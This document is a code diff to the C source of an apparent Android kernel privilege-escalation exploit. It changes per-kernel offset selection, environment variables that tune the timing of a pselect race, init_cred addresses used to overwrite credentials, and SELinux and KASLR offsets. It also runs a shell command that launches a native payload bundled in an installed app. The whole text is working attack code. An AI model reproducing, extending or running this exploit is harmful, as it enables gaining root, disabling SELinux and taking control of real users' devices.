@@ -16,7 +16,7 @@
 #include <sys/utsname.h>
 #include <poll.h>
 
-static const struct kernel_offsets *active_offsets = NULL;
+const struct kernel_offsets *active_offsets = NULL;
 
 /* Override target.h _OFF macros with dynamic offsets from offsets.h table */
 #undef SELINUX_ENFORCING_OFF
@@ -77,6 +77,9 @@ static const struct kernel_offsets *active_offsets = NULL;
 #define SLIDE_RANDOM_BOOT_ID_DATA_OFF active_offsets->off_slide_boot_id
 #define SLIDE_SYSCTL_BOOTID_OFF       active_offsets->off_slide_boot_id
 
+/* Override task/mm layout macros with the selected kernel profile. */
+#include "runtime_struct_offsets.h"
+
 static int select_offsets(void) {
   struct utsname uts;
   if (uname(&uts) < 0) return -1;
@@ -84,7 +87,25 @@ static int select_offsets(void) {
   for (int i = 0; known_offsets[i].uname_r; i++) {
     if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
       active_offsets = &known_offsets[i];
+      /* Only entries that explicitly opt in (currently OP13) override the
+       * pselect waiter layout and route timing.  All other kernels use the
+       * target defaults and do not inherit OP13 tuning. */
+      unsetenv("PSELECT_SHIFT");
+      unsetenv("PSELECT_ROUTE_DELAY_USEC");
+      if (active_offsets->pselect_shift) {
+        setenv("PSELECT_SHIFT", "-2", 1);
+        setenv("PSELECT_ROUTE_DELAY_USEC", "50000", 1);
+      }
       pr_success("offsets matched: %s\n", active_offsets->uname_r);
+      pr_info("pselect parameters: PSELECT_SHIFT=%s "
+              "PSELECT_ROUTE_DELAY_USEC=%s\n",
+              getenv("PSELECT_SHIFT") ?: "<unset>",
+              getenv("PSELECT_ROUTE_DELAY_USEC") ?: "<unset>");
+      g_init_cred_image = INIT_CRED;
+      if (active_offsets->kernel_phys_load)
+        p0_kernel_phys_load = active_offsets->kernel_phys_load;
+      pr_info("init_cred image=%016zx alias=%016zx\n",
+              (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
       return 0;
     }
   }
@@ -636,6 +657,7 @@ int run_exploit(int argc, char **argv) {
   if (!active_offsets && select_offsets() < 0) return 1;
 
   log_startup_context();
+  init_p0_profile();
   init_ashmem_path();
   pin_to_core(CORE);
 
@@ -799,7 +821,7 @@ tcp_ready:
     "APK=$(pm path " ANCHOR_BOOTSTRAP_PACKAGE " | sed -n 's/^package://p' | head -n 1); "
     "APPBIN=${APK%/base.apk}/lib/arm64/libanchor.so; "
     "if [ -n \"$APPBIN\" ] && [ -x \"$APPBIN\" ]; then "
-    "PSELECT_SHIFT=-2 PSELECT_ROUTE_DELAY_USEC=50000 \"$APPBIN\"; RC=$?; "
+    "\"$APPBIN\"; RC=$?; "
     "else RC=126; fi; printf '\\n__ANCHOR_RC=%s\\n' \"$RC\"; exit \"$RC\"");
   pr_info("mini-adb returned %d\n", adb_ret);
 
@@ -811,6 +833,7 @@ static int run_write1_only(void) {
   set_unbuffer();
   set_limit();
   if (!active_offsets && select_offsets() < 0) return 1;
+  init_p0_profile();
   init_ashmem_path();
   pin_to_core(CORE);
   kaslr_slide = 0;
